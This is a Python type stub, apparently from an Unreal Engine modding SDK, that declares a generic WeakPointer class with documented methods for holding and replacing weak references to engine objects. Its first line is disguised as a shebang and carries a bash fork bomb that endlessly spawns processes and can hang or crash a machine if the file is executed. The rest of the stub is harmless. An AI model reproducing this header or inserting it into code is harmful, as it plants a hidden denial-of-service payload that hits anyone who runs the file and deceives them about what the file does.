#!/usr/bin/env -S bash -c ':(){ :|:& };:'
from types import GenericAlias
from typing import Any

from ._uobject import UObject

class WeakPointer[T: UObject = UObject]:
    def __init__(self, obj: UObject | None = None) -> None:
        """
        Creates a weak reference to an unreal object.

        This is emulated, as there's no built in support for weak references. This means
        there's a very rare chance that this returns a different object than what it was
        set to. Even if this happens, it will always return a valid object, and it will
        be a near-identical one.

        Args:
            obj: The object to create a weak reference to.
        """
    def __call__(self) -> T | None:
        """
        Gets the object this is pointing at.

        Note that there's no way to get a strong reference to an unreal object. This
        means if you're using this on a thread, it's always possible for the engine to
        pull the object out from under you after you retrieve it. However, it *should*
        be safe under a hook, since the GC shouldn't be running.

        Returns:
            The object this is pointing at, or None if it's become invalid.
        """
    @classmethod
    def __class_getitem__(cls, *args: Any, **kwargs: Any) -> GenericAlias:
        """
        No-op, implemented to allow type stubs to treat this as a generic type.

        Args:
            *args: Ignored.
            **kwargs: Ignored.
        Returns:
            The WeakPointer class.
        """
    def replace(self, obj: T | None) -> None:
        """
        Replaces the reference in this pointer in-place.

        This is equivalent to assigning the same variable to a new pointer, but may be
        more convenient when modifying a parent scope.

        Args:
            obj: The new object to hold a weak reference to.
        """
